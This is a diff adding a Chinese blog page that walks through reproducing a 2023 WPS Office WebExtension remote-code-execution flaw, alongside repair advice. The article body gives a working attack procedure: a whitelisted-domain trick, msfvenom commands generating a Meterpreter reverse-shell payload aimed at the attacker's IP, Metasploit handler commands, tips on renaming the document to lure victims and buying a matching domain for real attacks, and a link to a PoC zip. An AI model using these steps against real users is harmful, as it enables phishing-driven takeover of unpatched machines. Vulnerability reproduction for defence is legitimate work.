@@ -1,0 +1,553 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="utf-8" />
+        <title>WPS_RCE | 小C♥天天</title>
+        <meta name="author" content="小C&天天" />
+        <meta name="description" content="^v^" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+        <link rel="icon" href="/images/icon.jpg" />
+        <script src="https://static-argvchs.netlify.app/libs/vue/3.3.4/vue.global.prod.min.js"></script>
+<link rel="preconnect" href="https://static-argvchs.netlify.app" crossorigin />
+<link rel="stylesheet" href="https://static-argvchs.netlify.app/libs/font-awesome/6.4.0/css/all.min.css" />
+<link rel="stylesheet" href="https://static-argvchs.netlify.app/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<!-- 兼容不同版本的浏览器 -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<!-- 高亮代码 -->
+<script src="https://static-argvchs.netlify.app/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<script src="https://static-argvchs.netlify.app/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link rel="stylesheet" href="https://static-argvchs.netlify.app/libs/highlight.js/11.8.0/styles/base16-onedark.min.css" />
+<script src="/js/lib/highlight.js"></script>
+
+
+<!-- 使用 KaTeX 渲染数学公式 -->
+<script src="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/katex.min.js"></script>
+<script src="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<!-- 简单的点击图片放大缩小的预览 -->
+<script src="/js/lib/preview.js"></script>
+
+
+<!-- 看板娘 -->
+<script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+
+
+
+<!-- 评论设置 -->
+
+<script
+    src="https://giscus.app/client.js"
+    data-repo="A7cc/giscus-comments"
+    data-repo-id="R_kgDOKKSvfw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOKKSvf84CYyp2"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+<script src="https://static-argvchs.netlify.app/libs/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="layout">
+            <!-- 页面加载 -->
+            <transition name="fade">
+                <div id="loading" v-show="loading">
+                    <div id="loading-circle">
+                        <h2>LOADING</h2>
+                        <p>正在加载</p>
+                        <img src="/images/afde9fa65a5742a90b51d6e1211e841e.gif" />
+                    </div>
+                </div>
+            </transition>
+            <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <a href="/tools">
+            <i class="fa-solid fa-tools fa-fw"></i>
+            <span>&ensp;工具</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+                <a href="/tools">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tools fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">工具</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+            <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+                <div id="article-posts-wrap" true ref="homePostsWrap">
+    <div class="article">
+        <div>
+            <h1>WPS_RCE</h1>
+        </div>
+        <div class="info">
+            <span class="date">
+                <span class="icon">
+                    <i class="fa-solid fa-calendar fa-fw"></i>
+                </span>
+                2023/8/31
+            </span>
+            
+            <span class="category">
+                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                    <span class="icon">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </span>
+                    漏洞复现
+                </a>
+            </span>
+            
+            
+            <span class="tags">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                
+                
+                <span class="tag">
+                    
+                    <a href="/tags/WPS/" style="color: #ff7d73">WPS</a>
+                </span>
+                
+                <span class="tag">
+                    
+                    <a href="/tags/%E9%92%93%E9%B1%BC/" style="color: #03a9f4">钓鱼</a>
+                </span>
+                
+            </span>
+            
+        </div>
+        
+        <div class="content" v-pre>
+            <h1 id="壹-漏洞概念"><a href="#壹-漏洞概念" class="headerlink" title="壹 漏洞概念"></a>壹 漏洞概念</h1><p><code>WPS Office</code>是由北京金山办公软件股份有限公司自主研发的一款办公软件套装，可以实现办公软件最常用的文字、表格、演示、PDF 阅读等多种功能，其具有内存占用低、运行速度快、云功能多、强大插件平台支持、免费提供在线存储空间及文档模板的优点。在国内，目前几乎所有的<code>PC</code>端都用到该办公软件进行日常的办公。2023年08月09日，<code>WPS Office for Windows</code>爆出存在<code>0day</code>漏洞，攻击者通过诱导用户打开文档中嵌入的远程链接即可触发此漏洞执行任意代码。</p>
+<span id="more"></span>
+<h1 id="贰-漏洞原理及利用条件"><a href="#贰-漏洞原理及利用条件" class="headerlink" title="贰 漏洞原理及利用条件"></a>贰 漏洞原理及利用条件</h1><p><code>WPS office for windows</code>使用了一种用于扩展<code>Microsoft Office</code>功能的技术，即<code>WebExtension</code>，该技术可以将第三方开发者开发的插件集成到自己的服务和功能中，本次漏洞是由于<code>WPS</code>在处理<code>WebExtension</code>时，未能正确的处理<code>javascript</code>代码，造成了溢出<code>RCE</code>（类似于之前的<code>chrome</code>浏览器<code>RCE</code>漏洞）。说白了，就是因为<code>WPS</code>内置浏览器存在逻辑漏洞，使得攻击者可以利用该漏洞专门构造出恶意文档，受害者打开该文档并点击文档中的<code>URL</code>链接或包含了超级链接的图片时，存在漏洞版本的<code>WPS office</code>会通过内嵌浏览器加载该链接，接着该链接中<code>js</code>脚本会通过<code>cefQuery</code>调用<code>WPS</code>端内<code>API</code>下载文件并打开文件，进而导致恶意文件在受害者电脑上被运行。</p>
+<p>利用条件：</p>
+<ul>
+<li><p>受害机使用的<code>WPS</code>需要在存在漏洞的对应版本内</p>
+</li>
+<li><p>攻击者需要在公网开启一个<code>web</code>服务，用来受害者服务其<code>html</code>文件，并且其域名需要遵循<code>http://clientweb.docer.wps.cn.&#123;xxxxx&#125;wps.cn</code>，猜测可能是使用了白名单检测，其匹配的规则为<code>http://clientweb.docer.wps.cn.*?wps.cn</code></p>
+</li>
+<li><p>受害机需要通过<code>http</code>协议访问到攻击机，并且打开恶意构造的<code>wps</code>文件</p>
+</li>
+</ul>
+<h1 id="叁-适用版本"><a href="#叁-适用版本" class="headerlink" title="叁 适用版本"></a>叁 适用版本</h1><pre><code class="bash">WPS Office 2023 个人版 &lt; 11.1.0.15120
+
+WPS Office 2019 企业版 &lt; 11.8.2.12085
+</code></pre>
+<h1 id="肆-复现环境说明"><a href="#肆-复现环境说明" class="headerlink" title="肆 复现环境说明"></a>肆 复现环境说明</h1><p>复现<code>WPS Office</code>版本：<code>11.1.0.12313</code></p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828102151065.png" alt="image-20230828102151065"></p>
+<p>攻击机（<code>kali</code>）：192.168.73.128</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828102432218.png" alt="image-20230828102432218"></p>
+<p>受害机（<code>Windows 10</code>）：192.168.73.130</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828102351428.png" alt="image-20230828102351428"></p>
+<p>连通性：</p>
+<p><code>kali</code>不能<code>ping</code>通<code>Windows10</code>，因为<code>windows10</code>开启了防火墙：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828102811285.png" alt="image-20230828102811285"></p>
+<p><code>Windows10</code>能<code>ping</code>通<code>kali</code>，与正常的业务一致需要访问外网：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828102822599.png" alt="image-20230828102822599"></p>
+<h1 id="伍-复现"><a href="#伍-复现" class="headerlink" title="伍 复现"></a>伍 复现</h1><h2 id="5-1-弹窗计算器"><a href="#5-1-弹窗计算器" class="headerlink" title="5.1 弹窗计算器"></a>5.1 弹窗计算器</h2><p>前期准备：</p>
+<ul>
+<li>受害机修改<code>host</code>文件，这里的<code>host</code>文件域名设置只需要遵循<code>clientweb.docer.wps.cn.&#123;xxxxx&#125;wps.cn</code>即可，但是<code>wps.cn</code>域名与<code>&#123;xxxxx&#125;wps.cn</code>域名并不存在绑定关系：</li>
+</ul>
+<pre><code class="bash">192.168.73.128  clientweb.docer.wps.cn.cloudwps.cn
+</code></pre>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828103258523.png" alt="image-20230828103258523"></p>
+<ul>
+<li>攻击机设置<code>web</code>服务，并且将<code>poc</code>文件放在当前文件夹下：</li>
+</ul>
+<pre><code class="bash">python3 -m http.server 80
+</code></pre>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828103708125.png" alt="image-20230828103708125"></p>
+<p>安装版本为<code>11.1.0.12313</code>的<code>WPS Office</code>办公软件并打开攻击者发送的存在问题的<code>poc.docx</code>文件，出现计算器弹窗：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828104105565.png" alt="image-20230828104105565"></p>
+<p>然后查看<code>kali</code>攻击机的<code>web</code>服务响应，可以看到存在请求：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828104330649.png" alt="image-20230828104330649"></p>
+<p>至此简单的计算器复现成功。</p>
+<h2 id="5-2-进一步getshell利用"><a href="#5-2-进一步getshell利用" class="headerlink" title="5.2 进一步getshell利用"></a>5.2 进一步getshell利用</h2><p>首先我们还是需要设置<code>host</code>文件，这里换一个新的域名，以确定其普遍性：</p>
+<pre><code class="bash">192.168.73.128  clientweb.docer.wps.cn.demowps.cn
+</code></pre>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828105415723.png" alt="image-20230828105415723"></p>
+<p>修改域名后，我们需要修改<code>poc.docx</code>文件，将其通过压缩工具解压，这里使用<code>7-zip</code>解压工具：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828105635500.png" alt="image-20230828105635500"></p>
+<p>修改<code>poc\word\webExtensions</code>下的<code>webExtensions1.xml</code>文件：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/../image-20230828105808963.png" alt="image-20230828105808963"></p>
+<p>修改为：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828105837221.png" alt="image-20230828105837221"></p>
+<p>保存后将其压缩，注意需要在<code>poc</code>文件内进行压缩：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828110100300.png" alt="image-20230828110100300"></p>
+<p>最后将<code>poc.zip</code>修改为诱惑受害者点击的名字即可：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828110239765.png" alt="image-20230828110239765"></p>
+<p>然后生成<code>msf</code>马：</p>
+<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.73.128 LPORT=4444 -f csharp &gt; shellcode.cs
+</code></pre>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828110554542.png" alt="image-20230828110554542"></p>
+<p>接着将<code>shellcode.cs</code>的<code>shellcode</code>代码，复制到<code>1.html</code>中的<code>shellcode</code>变量中，需要注意这里生成的是<code>C#</code>的<code>shellcode</code>：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828110741744.png" alt="image-20230828110741744"></p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828110846548.png" alt="image-20230828110846548"></p>
+<p>攻击机在<code>1.html</code>的目录下开启<code>web</code>服务：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828110940991.png" alt="image-20230828110940991"></p>
+<p>运行<code>msf</code>：</p>
+<pre><code class="bash">msfconsole
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set lhost 192.168.73.128
+msf6 exploit(multi/handler) &gt; set lport 4444
+msf6 exploit(multi/handler) &gt; run
+</code></pre>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828120224094.png" alt="image-20230828120224094"></p>
+<p>受害者点击<code>docx</code>文件：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828112043995.png" alt="image-20230828112043995"></p>
+<p>可以看到<code>getshell</code>成功：</p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828120654382.png" alt="image-20230828120654382"></p>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/image-20230828120706088.png" alt="image-20230828120706088"></p>
+<h2 id="5-3-实战中的思考"><a href="#5-3-实战中的思考" class="headerlink" title="5.3 实战中的思考"></a>5.3 实战中的思考</h2><p>整体的利用相对较为简单，利用的方法不需要受害机设置过多的配置，只需要点击攻击者发送的文档，即可被远控，在实验中，我们需要在客户端设置<code>host</code>文件绑定，但在实战中，只要购买一个遵循<code>clientweb.docer.wps.cn.&#123;xxxxx&#125;wps.cn</code>的域名即可，其他前期操作只需要在攻击机上设置。</p>
+<h1 id="陆-利用Poc-Exp以及工具"><a href="#陆-利用Poc-Exp以及工具" class="headerlink" title="陆 利用Poc|Exp以及工具"></a>陆 利用Poc|Exp以及工具</h1><p>利用的<code>poc</code>和存在问题的版本软件：</p>
+<p><a href="/tools/%E5%A4%8D%E7%8E%B0/WPS_RCE%E5%A4%8D%E7%8E%B0.zip">WPS_RCE复现.zip</a></p>
+<h1 id="柒-危害"><a href="#柒-危害" class="headerlink" title="柒 危害"></a>柒 危害</h1><p>攻击者通过诱导用户打开文档中嵌入的远程链接即可触发此漏洞执行任意代码。</p>
+<h1 id="捌-修复建议"><a href="#捌-修复建议" class="headerlink" title="捌 修复建议"></a>捌 修复建议</h1><ul>
+<li><p>官方修复方案：<br>参考官方通告，升级至安全版本：<a target="_blank" rel="noopener" href="https://security.wps.cn/notices/35">https://security.wps.cn/notices/35</a></p>
+</li>
+<li><p>临时修复方案：</p>
+<p>在未升级至安全版本前，建议不要用<code>WPS</code>打开来源未知的文档，更不要点击来源未知的文档中的任何链接。</p>
+</li>
+</ul>
+<h1 id="拾-参考"><a href="#拾-参考" class="headerlink" title="拾 参考"></a>拾 参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QdftHvdmXc5Id5YBOuPJ3g">2023HW 0day WPS-Office RCE 复现与分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ba0gu0/wps-rce">ba0gu0：WPS Office RCE</a></li>
+</ul>
+
+        </div>
+        
+        
+        <div id="comment">
+            <div id="giscus-container" class="giscus"></div>
+        </div>
+        
+    </div>
+    
+    <div id="article-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg" alt="avatar" />
+        </div>
+        <div class="name">小C&amp;天天</div>
+        <div class="description">
+            <p>修学储能 先博后渊</p>
+
+        </div>
+        
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        
+        
+        <div class="friend-links">
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">kyrieee</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">tonyd0g</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://ruyueattention.github.io/">ruyueattention</a>
+            </span>
+            
+        </div>
+        
+    </div>
+    
+    <!-- <br /> -->
+    <!-- 目录 -->
+    <!-- 
+    <div id="card-div">
+        <div id="toc" class="toc-article">
+            <strong class="toc-title">文章目录</strong>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E6%BC%8F%E6%B4%9E%E6%A6%82%E5%BF%B5"><span class="toc-text">壹 漏洞概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">贰 漏洞原理及利用条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC"><span class="toc-text">叁 适用版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%82%86-%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E8%AF%B4%E6%98%8E"><span class="toc-text">肆 复现环境说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%8D-%E5%A4%8D%E7%8E%B0"><span class="toc-text">伍 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E5%BC%B9%E7%AA%97%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-text">5.1 弹窗计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E8%BF%9B%E4%B8%80%E6%AD%A5getshell%E5%88%A9%E7%94%A8"><span class="toc-text">5.2 进一步getshell利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E6%80%9D%E8%80%83"><span class="toc-text">5.3 实战中的思考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%86-%E5%88%A9%E7%94%A8Poc-Exp%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="toc-text">陆 利用Poc|Exp以及工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%92-%E5%8D%B1%E5%AE%B3"><span class="toc-text">柒 危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8D%8C-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">捌 修复建议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BE-%E5%8F%82%E8%80%83"><span class="toc-text">拾 参考</span></a></li></ol>
+        </div>    
+    </div>
+     -->
+</div>
+
+<div id="card-style-fun">
+    
+    <br />
+    <div id="card-div">
+        <div class="good-sentence">
+            <div class="toolio">
+                <div class="circle"><span class="red"></span></div>
+                <div class="circle"><span class="yellow"></span></div>
+                <div class="circle"><span class="green"></span></div>
+                <div class="circle"><span class="text">今日诗句</span></div>
+            </div>
+            <div class="sentence">
+                <div id="sentenceid" onload="getsentence();"></div>
+            </div>
+        </div>
+    </div>
+    
+</div>
+
+
+
+    </div>
+    
+</div>
+                <!-- 页脚 -->
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            <script>
+                var now = new Date(); 
+                function createtime() { 
+                    var grt= new Date("07/10/2022 00:00:00");
+                    now.setTime(now.getTime()+250); 
+                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                    document.getElementById("timeDate").innerHTML = "已运行 "+dnum+" 天 "; 
+                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+                } 
+            setInterval("createtime()",250);
+            </script>
+        </div>
+        <div>
+            &copy;
+            2022 - 2023 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            &commat;小C&amp;天天
+        </div>
+        <div>
+            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a> 
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            <!-- 简单的点击图片放大缩小的预览 -->
+            
+            <div name="fade">
+                <div id="preview" ref="preview" v-show="previewShow">
+                    <img id="preview-content" ref="previewContent" />
+                </div>
+            </div>
+            
+        </div>
+        <!-- 看板娘 -->
+        
+        <div id="L2dCanvas"></div>
+        <script src="/js/lib/live2d.min.js"></script>
+        <!-- 设置随机模板 -->
+        
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "heitaizi_2",
+                mobile: true,
+            });
+        </script>
+        
+        <!-- 诗句 -->
+        
+        <script>
+            // // 每隔10分钟执行一次getsentence这个函数
+            window.setInterval(getsentence, 100*60*5);
+            function getsentence() {
+                // 这里没有考虑IE浏览器，如果需要择if判断加
+                var xhr = new XMLHttpRequest();  
+                xhr.open('GET', "https://zj.v.api.aa1.cn/api/wenan-shici/?type=json",true);
+                xhr.send(JSON.stringify(null));
+                xhr.onreadystatechange = function () {
+                    if (xhr.status === 200 && xhr.readyState === 4) {
+                        //js处理数据
+                        // xhr.responseText.match(/content":(".+?")/g)
+                        getdata = JSON.parse(xhr.responseText).msg;
+                    }else{
+                        getdata = "长风破浪会有时，直挂云帆济沧海。——李白《行路难》";
+                    }
+                    document.getElementById("sentenceid").innerHTML = getdata;
+                }
+            }
+            window.onload = getsentence;
+        </script>
+        
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/meteorbackground.js"></script>
+        
+        <script src="/js/main.js"></script>
+    </body>
+</html>
